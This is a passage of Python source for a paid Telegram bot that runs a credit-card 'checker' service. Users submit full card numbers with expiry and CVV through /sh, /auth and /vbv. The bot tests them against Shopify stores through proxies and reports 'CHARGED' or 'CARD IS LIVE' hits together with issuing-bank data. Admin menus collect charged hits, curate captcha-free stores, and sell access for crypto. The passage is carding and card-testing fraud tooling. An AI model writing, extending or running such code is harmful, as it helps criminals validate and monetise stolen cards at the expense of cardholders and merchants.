    rows = [[pbtn(f"{p['label']}  ·  {p['stars']}⭐", icon="star", color="success", callback_data=f"buy:{k}")] for k, p in products.items()]
    rows.append([pbtn(sc("Back"), icon="back", callback_data="menu:main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def proxy_kb(uid): return InlineKeyboardMarkup(inline_keyboard=[
    [pbtn(sc("Add Proxy"), icon="add", color="success", callback_data="proxy:add")],
    [pbtn(sc("Revalidate All"), icon="refresh", callback_data="proxy:check"),
     pbtn(sc("List"), icon="docs", callback_data="proxy:list")],
    [pbtn(sc("Clear All"), icon="trash", color="danger", callback_data="proxy:clear")],
    [pbtn(sc("Back"), icon="back", callback_data="menu:main")],
])

def hitters_kb(): return InlineKeyboardMarkup(inline_keyboard=[
    [pbtn(sc("Jio Single"), icon="fire_e", color="success", callback_data="hit:jio_info")],
    [pbtn(sc("Jio Mass"), icon="thunder_e", color="success", callback_data="hit:jiomass_info")],
    [pbtn(sc("VBV Checker"), icon="shield", color="success", callback_data="hit:vbv_info")],
    [pbtn(sc("Back"), icon="back", callback_data="menu:main")],
])

def pay_kb(): return InlineKeyboardMarkup(inline_keyboard=[
    [pbtn(sc("View Wallets"), icon="gem", color="success", callback_data="pay:wallets")],
    [pbtn(sc("Send Proof"), icon="docs", color="success", callback_data="pay:proof_help")],
    [pbtn(sc("Back"), icon="back", callback_data="menu:main")],
])

def limited_admin_kb(): return InlineKeyboardMarkup(inline_keyboard=[
    [pbtn(sc("Generate Code"), icon="add", color="success", callback_data="admin:gen_code")],
    [pbtn(sc("Broadcast"), icon="bell", callback_data="admin:broadcast")],
    [pbtn(sc("Close"), icon="cross1", color="danger", callback_data="admin:close")],
])

def admin_main_kb(uid=0):
    if uid and is_limited_admin(uid) and not is_full_admin(uid): return limited_admin_kb()
    maint      = get_setting("maintenance") == "1"
    log_ch     = get_setting("hit_log_channel", "")
    auto_post  = get_setting("auto_post_chat", "")
    pub_gc     = get_setting("public_gc_id", "")
    fb_ch      = get_setting("fb_channel_id", "")
    max_p      = get_setting("site_max_price", "3.0")
    sites      = get_sites()
    forces     = force_channels_list()
    api_count  = len(load_api_state()["endpoints"])
    gc_id, gc_name         = get_setting("charged_gc_id"), get_setting("charged_gc_name") or ""
    pvt_gc_id, pvt_gc_name = get_setting("pvt_file_gc_id"), get_setting("pvt_file_gc_name") or ""
    pvt_cc_id, pvt_cc_name = get_setting("pvt_cc_gc_id"), get_setting("pvt_cc_gc_name") or ""
    gc_label     = f"{sc('Charged GC')}: {(gc_name or gc_id)[:18]}" if gc_id else f"{sc('Charged GC')}: {sc('not set')}"
    pvt_label    = f"{sc('Pvt File GC')}: {(pvt_gc_name or pvt_gc_id)[:16]}" if pvt_gc_id else f"{sc('Pvt File GC')}: {sc('not set')}"
    pvt_cc_label = f"{sc('Pvt CC GC')}: {(pvt_cc_name or pvt_cc_id)[:16]}" if pvt_cc_id else f"{sc('Pvt CC GC')}: {sc('not set')}"
    mode_str     = mode_label()
    lb_vps_on, lb_hrk_on = load_handling_vps_on(), load_handling_heroku_on()
    lb_vps_label = f"{sc('LB VPS')}: {'ON' if lb_vps_on else 'OFF'} · {node_summary_str_vps()}"
    lb_hrk_label = f"{sc('LB Heroku')}: {'ON' if lb_hrk_on else 'OFF'} · {node_summary_str_heroku()}"
    rows = [
        [pbtn(f"{sc('Maintenance')}: {'ON' if maint else 'OFF'}", icon="warn_red" if maint else "online", color="danger" if maint else "primary", callback_data="admin:toggle_maint")],
        [pbtn(lb_vps_label, icon="online" if lb_vps_on else "warn", color="success" if lb_vps_on else "primary", callback_data="admin:toggle_load")],
        [pbtn(lb_hrk_label, icon="online" if lb_hrk_on else "warn", color="success" if lb_hrk_on else "primary", callback_data="admin:toggle_load_heroku")],
    ]
    if uid == OWNER_ID:
        rows.append([pbtn(sc("Live Node Monitor"), icon="chart", color="success", callback_data="nmon:page:vps:0")])
    rows += [
        [pbtn(f"{sc('Site Mode')}: {mode_str}", icon="settings", color="success" if mode_str != "AUTO" else "primary", callback_data="admin:toggle_site_mode")],
        [pbtn(gc_label,     icon="msg",  color="success" if gc_id else "primary",     callback_data="admin:gc")],
        [pbtn(pvt_label,    icon="docs", color="success" if pvt_gc_id else "primary", callback_data="admin:pvt_file_gc")],
        [pbtn(pvt_cc_label, icon="gem",  color="success" if pvt_cc_id else "primary", callback_data="admin:pvt_cc_gc")],
        [pbtn(f"{sc('Public GC')}: {str(pub_gc)[:14] or 'off'}", icon="chat", color="success" if pub_gc else "primary", callback_data="admin:set_public")],
        [pbtn(f"{sc('FB Channel')}: {str(fb_ch)[:14] or 'off'}", icon="msg", color="success" if fb_ch else "primary", callback_data="admin:set_fb_channel")],
        [pbtn(f"{sc('Sites')} ({len(sites)})", icon="shop", callback_data="admin:sites"), pbtn(sc("Health"), icon="online", callback_data="admin:health_refresh")],
        [pbtn(sc("Site Checker"), icon="check", color="success", callback_data="admin:site_checker")],
        [pbtn(f"{sc('Max Price')}: ${max_p}", icon="shop", color="success", callback_data="admin:set_max_price")],
        [pbtn(f"{sc('Hit Log')}: {str(log_ch)[:14] or 'off'}", icon="check" if log_ch else "warn", callback_data="admin:view_hitlog"), pbtn(sc("Set"), icon="pen", color="success", callback_data="admin:set_hitlog")],
        [pbtn(f"{sc('Auto-Post')}: {str(auto_post)[:14] or 'off'}", icon="msg", callback_data="admin:view_autopost")],
        [pbtn(sc("Charged Hits (.txt)"), icon="docs", color="success", callback_data="admin:charged_txt"), pbtn(sc("Clear"), icon="trash", color="danger", callback_data="admin:charged_clear")],
        [pbtn(f"{sc('Force Channels')} ({len(forces)})", icon="unlock", callback_data="admin:force_list")],
        [pbtn(sc("Users"), icon="user", callback_data="admin:users:0"), pbtn(sc("Banned"), icon="warn", color="danger", callback_data="admin:banned")],
        [pbtn(sc("Recent Checks"), icon="docs", callback_data="admin:recent"), pbtn(sc("Top Checkers"), icon="chart", callback_data="admin:top")],
        [pbtn(sc("User Lookup"), icon="user", callback_data="admin:user_lookup"), pbtn(sc("Ban / Unban"), icon="warn", color="danger", callback_data="admin:ban")],
        [pbtn(sc("Generate Code"), icon="add", color="success", callback_data="admin:gen_code")],
        [pbtn(sc("Give Plan"), icon="gem", color="success", callback_data="admin:give_plan"), pbtn(sc("Give Points"), icon="gem2", color="success", callback_data="admin:give_points")],
        [pbtn(sc("Add Premium"), icon="star", color="success", callback_data="admin:add_premium")],
        [pbtn(sc("Star Pricing"), icon="star", color="success", callback_data="admin:star_pricing"), pbtn(sc("Crypto Wallets"), icon="gem", color="success", callback_data="admin:crypto")],
        [pbtn(sc("Jio API URL"), icon="link", color="success", callback_data="admin:set_jio_url")],
        [pbtn(sc("Add Admin"), icon="add", color="success", callback_data="admin:add_admin"), pbtn(sc("Add Ltd Admin"), icon="add", color="success", callback_data="admin:add_ltd_admin")],
        [pbtn(sc("Broadcast"), icon="bell", callback_data="admin:broadcast"), pbtn(sc("Stats"), icon="chart", callback_data="admin:stats")],
        [pbtn(sc("Backup Now"), icon="docs", color="success", callback_data="admin:backup_now"), pbtn(sc("Restore"), icon="forward", color="danger", callback_data="admin:restore")],
        [pbtn(sc("Clear Cache"), icon="trash", color="danger", callback_data="admin:clear_cache")],
        [pbtn(sc("Close"), icon="cross1", color="danger", callback_data="admin:close")],
    ]
    if uid == OWNER_ID:
        rows.insert(-1, [pbtn(f"{sc('APIs')} ({api_count})", icon="settings", color="success", callback_data="admin:apis")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def force_list_kb():
    rows = [[pbtn(ch['title'][:30] or ch['chat_id'], icon="check" if ch["enabled"] else "warn", callback_data=f"admin:force_view:{ch['chat_id']}")] for ch in force_channels_list()]
    rows.append([pbtn(sc("Add Channel"), icon="add", color="success", callback_data="admin:force_add")])
    rows.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

SITES_PER_PAGE = 8
def sites_kb(page=0):
    try: health = json.loads(get_setting("site_health", "{}") or "{}")
    except: health = {}
    sites = get_sites(); total = len(sites); total_pages = max(1, (len(sites) + SITES_PER_PAGE - 1) // SITES_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    start, end = page * SITES_PER_PAGE, min((page + 1) * SITES_PER_PAGE, total)
    rows = []
    for i in range(start, end):
        s = sites[i]; fails = _site_fail_count.get(s, 0); benched = _is_site_benched(s); h = health.get(s, "unknown")
        icon = "warn_red" if (benched or h == "down") else ("check" if h == "ok" else "diamond2")
        label = s.replace('.myshopify.com', '') + (f" ⚠{fails}" if fails else "") + (" · BENCHED" if benched else "")
        rows.append([pbtn(label[:40], icon=icon, callback_data=f"admin:site_view:{i}")])
    nav = []
    if page > 0: nav.append(pbtn(sc("Prev"), icon="back", callback_data=f"admin:sites:{page-1}"))
    nav.append(pbtn(f"{page+1}/{total_pages}", icon="docs", callback_data=f"admin:sites:{page}"))
    if end < total: nav.append(pbtn(sc("Next"), icon="forward", callback_data=f"admin:sites:{page+1}"))
    if nav: rows.append(nav)
    rows.extend([[pbtn(sc("Add Site"), icon="add", color="success", callback_data="admin:add_site")], [pbtn(sc("Bulk Add (txt)"), icon="docs", color="success", callback_data="admin:add_sites_bulk")], [pbtn(sc("Site Checker"), icon="check", color="success", callback_data="admin:site_checker")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def api_list_kb():
    rows = [[pbtn(f"{'✓' if ep.get('enabled', True) else '✗'} [{i}] {ep['url'].replace('http://', '').replace('https://', '')[:26]} · {'SR' if ep.get('site_required', False) else 'NS'} · {ep.get('cap', DEFAULT_WORKERS_CAP)} · {ep.get('style', 'params')}", icon="check" if ep.get("enabled", True) else "cross1", callback_data=f"admin:api_view:{i}")] for i, ep in enumerate(load_api_state()["endpoints"])]
    rows.extend([[pbtn(sc("Add API"), icon="add", color="success", callback_data="admin:api_add")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(page=0, per_page=10):
    with db() as c:
        total = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"]
        rows = c.execute("SELECT uid, username, plan FROM users ORDER BY uid LIMIT ? OFFSET ?", (per_page, page * per_page)).fetchall()
    kb = [[pbtn(f"{r['uid']} · {r['username'] or 'anon'} · {r['plan']}", icon="user", callback_data=f"admin:user_view:{r['uid']}")] for r in rows]
    nav = []
    if page > 0: nav.append(pbtn(sc("Prev"), icon="back", callback_data=f"admin:users:{page-1}"))
    if (page+1)*per_page < total: nav.append(pbtn(sc("Next"), icon="forward", callback_data=f"admin:users:{page+1}"))
    if nav: kb.append(nav)
    kb.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    return InlineKeyboardMarkup(inline_keyboard=kb), total, page

# ── Quota / streak ───────────────────────────────────────────────────────────
user_cooldowns = {}
def refresh_daily(uid):
    today = datetime.now(timezone.utc).date().isoformat()
    with db() as c:
        row = c.execute("SELECT last_credit_date, last_check_date FROM users WHERE uid=?", (uid,)).fetchone()
        if row:
            if row["last_credit_date"] != today: c.execute("UPDATE users SET credits=credits+50, last_credit_date=? WHERE uid=?", (today, uid))
            if row["last_check_date"] != today: c.execute("UPDATE users SET daily_checks=0, last_check_date=? WHERE uid=?", (today, uid))
def consume_quota(uid):
    if is_admin(uid): return True, "admin"
    ensure_user(uid); refresh_daily(uid); u = get_user(uid)
    if not u: return False, "limit"
    plan_key = u["plan"] if u["plan"] in PLANS else "free"
    if plan_key in ("premium", "max", "unlimited"):
        with db() as c: c.execute("UPDATE users SET daily_checks=daily_checks+1, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "unlimited"
    if u["daily_checks"] < PLANS[plan_key]["limit"]:
        with db() as c: c.execute("UPDATE users SET daily_checks=daily_checks+1, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "daily"
    if u["credits"] >= 2:
        with db() as c: c.execute("UPDATE users SET credits=credits-2, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "credits"
    return False, "limit"
def apply_streak(uid):
    today, yesterday = datetime.now(timezone.utc).date().isoformat(), (datetime.now(timezone.utc).date() - timedelta(days=1)).isoformat()
    result = {"streak": 0, "reward": None, "credits": 0, "new_day": False}
    try:
        with db() as c:
            row = c.execute("SELECT streak, last_streak_date, credits FROM users WHERE uid=?", (uid,)).fetchone()
            if not row: return result
            streak, last_date, credits = row["streak"] or 0, row["last_streak_date"] or "", row["credits"] or 0
            if last_date == today: result.update(streak=streak, credits=credits); return result
            streak = (streak + 1) if last_date == yesterday else 1; reward = None
            if streak == 7: credits += 50; reward = "+50 credits (7-day streak)"
            elif streak == 30: upgrade_user(uid, "pro", 1); reward = "1-day Pro trial (30-day streak)"
            c.execute("UPDATE users SET streak=?, last_streak_date=?, credits=? WHERE uid=?", (streak, today, credits, uid))
            result.update(streak=streak, reward=reward, credits=credits, new_day=True)
    except: pass
    return result

LOADING_FRAMES = [f"{pe('loading')} <b>{sc('Connecting')}</b>", f"{pe('refresh')} <b>{sc('Checking')}</b>", f"{pe('hourglass')} <b>{sc('Processing')}</b>", f"{pe('diamond')} <b>{sc('Analyzing')}</b>"]
async def animate_loading(msg, cc_line, stop_event):
    i = 0
    while not stop_event.is_set():
        try: await msg.edit_text(f"{spinner_frame(i)} {LOADING_FRAMES[i % len(LOADING_FRAMES)]}\n<blockquote><code>{cc_line}</code></blockquote>", parse_mode="HTML")
        except: pass
        i += 1
        try: await asyncio.wait_for(stop_event.wait(), timeout=1.2)
        except asyncio.TimeoutError: pass

def format_result(cc: str, res: Dict[str, Any], bin_info=None) -> str:
    try:
        cls = res.get("cls", "declined")
        resp_msg = _sanitize_err(res.get("response", "Unknown") or "Unknown")
        amount = float(res.get("amount", 0.0) or 0.0)
        currency = res.get("currency", "USD") or "USD"
        gateway = res.get("gateway", "Shopify") or "Shopify"
        ctime = res.get("check_time", "") or ""
        if cls in ("error", "timeout", "proxy_error", "site_error", "rate_limited"):
            icon = pe("warn_red") if cls in ("proxy_error","site_error") else pe("cross1")
            label = {"error":"Check Failed","timeout":"Timed Out","proxy_error":"Proxy Error","site_error":"Site Error","rate_limited":"Rate Limited"}.get(cls,"Failed")
            return f"{icon} <b>{sc(label)}</b>\n<blockquote>{brand_pe(cc)}  <code>{cc}</code>\n{pe('warn')} {esc(resp_msg[:120])}</blockquote>"
        title_map = {"charged": f"{pe('check')} <b>{sc('CHARGED · ORDER PAID')}</b>", "approved_3ds": f"{pe('online')} <b>{sc('APPROVED · 3DS')}</b>", "approved_nsf": f"{pe('online')} <b>{sc('APPROVED · NSF')}</b>", "approved_ccn": f"{pe('online')} <b>{sc('APPROVED · CCN')}</b>", "approved": f"{pe('online')} <b>{sc('CARD IS LIVE')}</b>", "captcha": f"{pe('warn')} <b>{sc('CAPTCHA · RETRY')}</b>", "declined": f"{pe('cross2')} <b>{sc('DECLINED')}</b>"}
        title = title_map.get(cls, f"{pe('cross2')} <b>{sc('DECLINED')}</b>")
        bin_line = ""
        if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
            country_data = bin_info.get("Country") or {}
            _ctype = str(bin_info.get("Type") or "N/A").upper()
            _ctype_icon = "gem" if _ctype == "CREDIT" else ("diamond" if _ctype == "DEBIT" else "star")
            bin_line = f"{pe('shop')}  <b>{sc('Bank')}</b>  ·  {esc(bin_info.get('Issuer', 'N/A') or 'N/A')}\n{country_flag(country_data.get('Code', ''))}  <b>{sc('Country')}</b>  ·  {esc(country_data.get('Name', 'N/A') or 'N/A')}\n{pe(_ctype_icon)}  <b>{sc('Type')}</b>  ·  {esc(_ctype)}\n"
        time_line = f"{pe('hourglass')}  <b>{sc('Time')}</b>  ·  {esc(ctime)}\n" if ctime else ""
        node_line = f"{pe('online')}  <b>{sc('Node')}</b>  ·  {esc(res['_node'])}\n" if res.get("_node") else ""
        return f"{title}\n<blockquote>{brand_pe(cc)}  <code>{cc}</code></blockquote>\n<blockquote>{pe('check2')}  <b>{sc('Resp')}</b>  ·  {esc(resp_msg)}\n{pe('gem')}  <b>{sc('Amount')}</b>  ·  <b>${amount:.2f} {esc(currency)}</b>\n{pe('diamond')}  <b>{sc('Gate')}</b>  ·  {esc(gateway)}\n{time_line}{bin_line}{node_line}</blockquote>\n<i>{sc('Dev')} {dev_link()}</i>"
    except Exception as e:
        log.error(f"format_result error: {e}")
        return f"Result: {res.get('cls', 'unknown')} - {res.get('response', '')}"

def welcome_text(user_row, first_name):
    plan_key = user_row["plan"] if user_row["plan"] in PLANS else "free"
    try:
        with db() as c: total_users = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"]
    except: total_users = 0
    unlimited = is_admin(user_row["uid"]) or plan_key in ("premium", "max", "unlimited")
    limit = PLANS[plan_key]["limit"] or 1
    pct = int(100 * user_row["daily_checks"] / limit)
    credits_d = "∞" if unlimited else str(user_row["credits"])
    limit_d = "∞" if unlimited else str(PLANS[plan_key]["limit"])
    mass_d = "∞" if is_admin(user_row["uid"]) else str(PLANS[plan_key]["mass_limit"])
    vps_d = sc("ON") if load_handling_vps_on() else sc("OFF")
    hrk_d = sc("ON") if load_handling_heroku_on() else sc("OFF")
    return (
        f"{pe('spark')} <b>{BOT_BRAND}</b> {pe('spark')}\n"
        f"<blockquote>"
        f"{pe('online')}  {sc('Status')} · <b>{sc('Online')}</b>\n"
        f"{pe('diamond')}  {sc('Mode')} · <b>{sc('Charge / Auth')}</b>\n"
        f"{pe('refresh')}  {sc('Speed')} · <b>{sc('Ultra Fast')}</b>\n"
        f"{pe('link')}  {sc('LB')} · <b>VPS {vps_d}</b>  ·  <b>HRK {hrk_d}</b>"
        f"</blockquote>\n"
        f"<blockquote>"
        f"{pe('user')}  <b>{esc(first_name)}</b>  ·  {pe('gem')} <b>{sc(PLANS[plan_key]['name'].upper())}</b>\n"
        f"{pe('chart')}  {sc('Daily')} · <b>{user_row['daily_checks']}/{limit_d}</b>  <code>{make_bar(pct, width=9)}</code> {pct}%\n"
        f"{pe('shop')}  {sc('Batch')} · <b>{mass_d}</b> {sc('cards')}\n"
        f"{pe('star')}  {sc('Credits')} · <b>{credits_d}</b>\n"
        f"{pe('smile')}  {sc('Members')} · <b>{total_users:,}</b>"
        f"</blockquote>\n"
        f"<blockquote>"
        f"{pe('chat')}  {sc('Support')} · <code>/mdev &lt;message&gt;</code>\n"
        f"{pe('star')}  {sc('Access')} · <code>/pay</code>"
        f"</blockquote>"
    )

def parse_site_list(raw: str):
    parsed, seen = [], set()
    for l in re.split(r"[\r\n,;]+", raw or ""):
        s = l.strip().lower()
        if not s or s.startswith("#"): continue
        s = s[8:] if s.startswith("https://") else s[7:] if s.startswith("http://") else s
        s = s.split("/")[0]
        if s and s not in seen: seen.add(s); parsed.append(s)
    return parsed

def format_site_checker_report(result: Dict[str, Any]) -> str:
    lines = [f"{pe('check')} <b>{sc('Site Checker')}</b>", f"<blockquote>{pe('shop')} {sc('Total')}: <b>{result['total']}</b>", f"{pe('check')} {sc('Clean')}: <b>{len(result['clean'])}</b>", f"{pe('warn')} {sc('Captcha')}: <b>{len(result['captcha'])}</b>", f"{pe('cross2')} {sc('Dead')}: <b>{len(result['dead'])}</b></blockquote>"]
    if result["clean"]:
        lines.append(f"<blockquote><b>{sc('Clean sites')}:</b>")
        for c in result["clean"][:20]: lines.append(f"{pe('check')} <code>{esc(c['site'])}</code> · ${c['price']:.2f}")
        if len(result["clean"]) > 20: lines.append(f"<i>...and {len(result['clean'])-20} more</i>")
        lines.append("</blockquote>")
    if result["dead"]:
        lines.append(f"<blockquote><b>{sc('Dead sites')}:</b>")
        for d in result["dead"][:10]: lines.append(f"{pe('cross2')} <code>{esc(d['site'])}</code> · {esc(_sanitize_err(d['reason']))}")
        if len(result["dead"]) > 10: lines.append(f"<i>...and {len(result['dead'])-10} more</i>")
        lines.append("</blockquote>")
    return "\n".join(lines)

async def run_site_checker_flow(msg: Message, raw_sites: str):
    sites = parse_site_list(raw_sites)
    if not sites: return await msg.answer(f"{pe('cross1')} <b>{sc('No sites provided')}</b>", parse_mode="HTML")
    st = await msg.answer(f"{pe('loading')} <b>{sc('Site Checker')}</b>\n<blockquote>{sc('Testing')} {len(sites)} {sc('sites')}...</blockquote>", parse_mode="HTML")
    result = await check_sites_clean(sites)
    try: await st.edit_text(format_site_checker_report(result), parse_mode="HTML")
    except: await msg.answer(format_site_checker_report(result), parse_mode="HTML")
    if result["clean"]:
        try: await msg.answer_document(BufferedInputFile("\n".join(c["site"] for c in result["clean"]).encode(), filename="clean_sites.txt"), caption=f"{pe('check')} <b>{len(result['clean'])} {sc('clean sites')}</b>", parse_mode="HTML")
        except: pass

async def redeem_code(msg: Message, code: str) -> None:
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    code = normalize_key_input(code)
    if not code: return
    with db() as c:
        row = c.execute("SELECT * FROM redeem_codes WHERE code=?", (code,)).fetchone()
        if not row: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid code')}</b>", parse_mode="HTML")
        if row["plan"] not in PLANS: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid plan in code')}</b>", parse_mode="HTML")
        if row["used"] >= row["max_uses"]: return await msg.answer(f"{pe('cross1')} <b>{sc('Code fully used')}</b>", parse_mode="HTML")
        if c.execute("SELECT 1 FROM redeem_log WHERE code=? AND uid=?", (code, uid)).fetchone(): return await msg.answer(f"{pe('cross1')} <b>{sc('Already redeemed')}</b>", parse_mode="HTML")
        c.execute("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
        c.execute("INSERT INTO redeem_log(code, uid, used_at) VALUES (?,?,?)", (code, uid, datetime.now(timezone.utc).isoformat()))
    upgrade_user(uid, row["plan"], row["days"])
    await msg.answer(f"{pe('check')} <b>{sc('Code Redeemed')}</b>\n<blockquote>{pe('gem')} {sc('Plan')}: <b>{PLANS[row['plan']]['name']}</b>\n{pe('hourglass')} {sc('Days')}: <b>{row['days']}</b></blockquote>", parse_mode="HTML")
    pub = get_setting("public_gc_id")
    if pub and _bot_ref:
        try:
            chat_id = int(pub) if re.fullmatch(r"-?\d+", pub) else pub
            await _bot_ref.send_message(chat_id, f"{pe('gem')} <b>CODE REDEEMED</b>\n<blockquote>{pe('user')} <b>UID:</b> <code>{uid}</code>\n{pe('user')} <b>User:</b> @{esc(msg.from_user.username or 'N/A')}\n{pe('star')} <b>Code:</b> <code>{code}</code>\n{pe('gem')} <b>Plan:</b> {PLANS[row['plan']]['name']} · {row['days']}d</blockquote>", parse_mode="HTML")
        except: pass

async def broadcast_all(bot, *, text: Optional[str] = None, photo: Optional[str] = None, caption: Optional[str] = None) -> Dict[str, int]:
    with db() as c: users = c.execute("SELECT uid FROM users WHERE banned=0").fetchall()
    ok, fail = 0, 0
    for u in users:
        try:
            if photo: await bot.send_photo(u["uid"], photo=photo, caption=caption or "", parse_mode="HTML")
            else: await bot.send_message(u["uid"], text or "", parse_mode="HTML")
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    return {"ok": ok, "fail": fail, "total": len(users)}

FIRST_TIME_PINNED = (
    f"<b>{BOT_BRAND}</b>\n\n"
    f"<b>• 𝗕𝗢𝗧 𝗜𝗦 𝗦𝗧𝗘𝗔𝗟𝗘𝗥 𝗟𝗘𝗦𝗦</b>\n"
    f"<b>• 𝗦𝗢 𝗜𝗧'𝗦 𝗣𝗔𝗜𝗗 𝗢𝗡𝗟𝗬</b>\n"
    f"<b>• 𝗙𝗨𝗖𝗞 𝗛𝗔𝗧𝗘𝗥'𝗦</b>\n\n"
    f"<i>Use /pay to unlock · /mdev for support</i>"
)

@router.message(CommandStart())
async def cmd_start(msg: Message, command: CommandObject):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid):
        return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    if msg.chat.type in ("group", "supergroup"):
        return await msg.answer(
            f"{pe('spark')} <b>{BOT_BRAND}</b>\n"
            f"<blockquote>"
            f"{pe('docs')} <code>/sh CC|MM|YY|CVV</code>\n"
            f"{pe('fire_e')} <code>/jhit NUM AMT CC</code>\n"
            f"{pe('shield')} <code>/vbv CC|MM|YY|CVV</code>\n"
            f"{pe('gem')} <code>/redeem KEY</code>"
            f"</blockquote>",
            parse_mode="HTML")

    u = get_user(uid)
    if u and u["welcomed"] == 0:
        try:
            pin = await msg.answer(FIRST_TIME_PINNED, parse_mode="HTML")
            try: await msg.bot.pin_chat_message(msg.chat.id, pin.message_id, disable_notification=True)
            except: pass
            with db() as c: c.execute("UPDATE users SET welcomed=1 WHERE uid=?", (uid,))
        except: pass

    if command and command.args and command.args.startswith("ref_"):
        try:
            referrer_id = int(command.args.split("_")[1])
            user = get_user(uid)
            if user and referrer_id != uid and user["referred_by"] == 0:
                ensure_user(referrer_id)
                with db() as c:
                    c.execute("UPDATE users SET referred_by=? WHERE uid=?", (referrer_id, uid))
                    c.execute("UPDATE users SET refer_count=refer_count+1 WHERE uid=?", (referrer_id,))
        except: pass

    if not await check_force_sub(msg.bot, uid):
        kb_rows = [[pbtn(f"{sc('Join')} {ch['title'][:25] or sc('Channel')}", icon="chat", url=ch["invite_link"] or f"https://t.me/{ch['chat_id'].lstrip('@')}")] for ch in force_channels_list(enabled_only=True)]
        kb_rows.append([pbtn(sc("Verify"), icon="check", color="success", callback_data="verify_sub")])
        return await msg.answer(
            f"{pe('unlock')} <b>{sc('Access Restricted')}</b>\n"
            f"<blockquote>{sc('Join required channels to continue')}.</blockquote>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))

    apply_streak(uid)
    user = get_user_or_create(uid, msg.from_user.username or "")
    caption = welcome_text(user, msg.from_user.first_name)
    try: await msg.answer_photo(photo=IMG_MAIN, caption=caption, reply_markup=main_menu_kb(uid))
    except: await msg.answer(caption, parse_mode="HTML", reply_markup=main_menu_kb(uid))

@router.message(Command("id"))
async def cmd_id(msg: Message):
    await msg.answer(f"{pe('link')} <b>{sc('Chat Info')}</b>\n<blockquote>{pe('chat')} {sc('Title')}: <b>{esc(getattr(msg.chat, 'title', None) or msg.chat.type)}</b>\n{pe('diamond')} {sc('Type')}: <b>{msg.chat.type}</b>\n{pe('num1')} {sc('Chat ID')}: <code>{msg.chat.id}</code>\n{pe('user')} {sc('Your ID')}: <code>{msg.from_user.id}</code></blockquote>", parse_mode="HTML")

@router.message(Command("panel", "admin"))
async def cmd_panel(msg: Message):
    if not is_admin(msg.from_user.id): return
    if is_limited_admin(msg.from_user.id) and not is_full_admin(msg.from_user.id):
        return await msg.answer(f"{pe('settings')} <b>{sc('Admin Panel')}</b>\n<blockquote>{pe('user')} {sc('Limited Admin')}</blockquote>", parse_mode="HTML", reply_markup=admin_main_kb(msg.from_user.id))
    text = f"{hdr('ADMIN PANEL', 'settings')}\n<blockquote>{pe('user')} <b>{BOT_BRAND}</b></blockquote>"
    try: await msg.answer_photo(photo=IMG_ADMIN, caption=text, reply_markup=admin_main_kb(msg.from_user.id))
    except: await msg.answer(text, parse_mode="HTML", reply_markup=admin_main_kb(msg.from_user.id))

@router.message(Command("sh", "check"))
async def cmd_check(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    if not load_handling_on() and (not _filtered_endpoints() or (endpoints_need_sites() and not get_sites())): return await msg.answer(f"{pe('warn')} <b>{sc('No API/Sites configured')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b> <code>/sh CC|MM|YY|CVV</code>", parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>", parse_mode="HTML")
    await process_check_logic(msg, cc, msg.bot, mode="shopify")

@router.message(Command("auth"))
async def cmd_auth(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    if not is_admin(uid) and not user_proxy_list(uid): return await msg.answer(f"{pe('cross1')} <b>{sc('Proxy Required')}</b>\n<blockquote>{pe('link')} /proxy</blockquote>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b> <code>/auth CC|MM|YY|CVV</code>", parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>", parse_mode="HTML")
    await process_check_logic(msg, cc, msg.bot, mode="auth")

@router.message(Command("redeem"))
async def cmd_redeem(msg: Message):
    if get_setting("maintenance") == "1" and not is_admin(msg.from_user.id): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('gem2')} <b>{sc('Redeem Code')}</b>\n<blockquote>{pe('docs')} {sc('Usage')}: <code>/redeem CODE</code></blockquote>", parse_mode="HTML")
    await redeem_code(msg, args[1])

@router.message(Command("sitecheck"))
async def cmd_sitecheck(msg: Message):
    if not is_full_admin(msg.from_user.id): return
    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
        if not (doc.file_name or "").lower().endswith(".txt") or (doc.file_size or 0) > 5 * 1024 * 1024: return await msg.answer("only .txt files <5MB", parse_mode="HTML")
